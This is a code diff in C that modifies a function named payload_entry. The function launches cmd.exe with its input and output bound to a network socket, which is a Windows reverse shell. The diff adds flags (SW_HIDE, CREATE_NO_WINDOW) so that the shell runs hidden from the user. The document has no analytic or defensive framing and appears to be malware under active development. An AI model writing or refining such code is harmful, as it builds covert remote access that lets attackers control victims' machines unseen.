@@ -37,16 +37,17 @@ void payload_entry() {
     }
 
     STARTUPINFOA si = {0};
-    si.cb         = sizeof(si);
-    si.dwFlags    = STARTF_USESTDHANDLES;
-    si.hStdInput  = (HANDLE)sock;
-    si.hStdOutput = (HANDLE)sock;
-    si.hStdError  = (HANDLE)sock;
+    si.cb          = sizeof(si);
+    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdInput   = (HANDLE)sock;
+    si.hStdOutput  = (HANDLE)sock;
+    si.hStdError   = (HANDLE)sock;
 
     PROCESS_INFORMATION pi = {0};
     CreateProcessA(
         NULL, (LPSTR)"cmd.exe",
-        NULL, NULL, TRUE, 0,
+        NULL, NULL, TRUE, CREATE_NO_WINDOW,
         NULL, NULL, &si, &pi
     );
 
